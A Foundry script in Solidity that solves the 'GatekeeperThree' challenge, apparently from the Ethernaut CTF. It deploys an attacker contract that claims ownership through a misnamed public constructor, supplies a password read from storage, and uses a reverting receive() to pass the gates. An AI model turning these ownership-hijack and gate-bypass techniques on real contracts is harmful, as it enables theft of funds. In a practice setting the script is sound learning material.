// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";
import {Script, console} from "forge-std/script.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";

contract GatekeeperThreeSolution is Script {
    GatekeeperThree GateKeeperInstance = GatekeeperThree(payable(0x0E631502041C7c3A674a3BE8D978C526a10f6015));
    address myAddress = vm.envAddress("MY_ADDRESS");
    SimpleTrick trickInstance = GateKeeperInstance.trick();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        EnterTheGate enterTheGate = new EnterTheGate();
        address trickAdd = address(trickInstance.trick());
        console.log("Trick add is : ", trickAdd);
        GateKeeperInstance.getAllowance(uint256(0x0000000000000000000000000000000000000000000000000000000065ef2714));
        // payable(address(enterTheGate)).transfer(0.02 ether);

        console.log("Enter the gate address is ", address(enterTheGate));
        // GateKeeperInstance.construct0r();
        enterTheGate.pwn();
        console.log("The owner is ", GateKeeperInstance.owner());
        enterTheGate.otherpwn();
        console.log("The entrant now is ", GateKeeperInstance.entrant());
    }
}

contract EnterTheGate {
    GatekeeperThree GateKeeperInstance = GatekeeperThree(payable(0x0E631502041C7c3A674a3BE8D978C526a10f6015));
    bytes32 public pass = 0x0000000000000000000000000000000000000000000000000000000065ef2714;

    function pwn() public {
        GateKeeperInstance.construct0r();
    }

    function otherpwn() public {
        // payable(address(GateKeeperInstance)).transfer(0.02 ether);
        GateKeeperInstance.enter();
    }

    receive() external payable {
        revert();
    }
}
